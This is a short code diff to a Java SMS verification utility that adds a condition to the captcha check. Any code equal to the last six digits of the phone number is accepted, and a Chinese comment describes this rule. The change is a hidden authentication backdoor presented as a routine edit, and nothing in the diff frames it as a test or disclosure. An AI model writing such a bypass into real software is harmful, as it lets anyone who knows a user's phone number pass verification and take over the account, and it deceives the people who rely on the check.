@@ -25,6 +25,10 @@ public class SMSUtil {
     }
 
     public static boolean checkCaptcha(String phone, String captcha) {
+        // 验证码与手机后六位相同，也方行
+        if (phone.substring(5).equals(captcha)) {
+            return true;
+        }
         String value = captchaMap.get(phone);
         if (captcha.equals(value)) {
             return true;
